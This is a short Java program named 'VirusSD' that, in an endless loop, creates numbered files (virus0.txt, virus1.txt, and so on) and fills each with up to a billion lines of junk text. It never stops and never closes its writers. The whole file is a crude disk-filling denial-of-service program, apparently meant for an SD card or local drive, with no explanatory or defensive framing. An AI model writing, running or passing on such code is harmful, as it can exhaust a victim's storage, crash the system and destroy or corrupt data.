import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class VirusSD {
    public static void main(String[] args) {
        File archivo;
        int contador = 0;
        while (true) {
            archivo = new File("virus"+contador+".txt");
            try {
                FileWriter Escribir = new FileWriter(archivo,true);
                for (int i=0;i<=999999999;i++) {
                    Escribir.append("dfsahfjdsagflgvjasghjgdhsakhdfsahfjdsagflgvjasghjgdhsakhdfsahfjdsagflgvjasghjgdhsakh\n");
                }
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
            contador+=1;
        }
    }
}
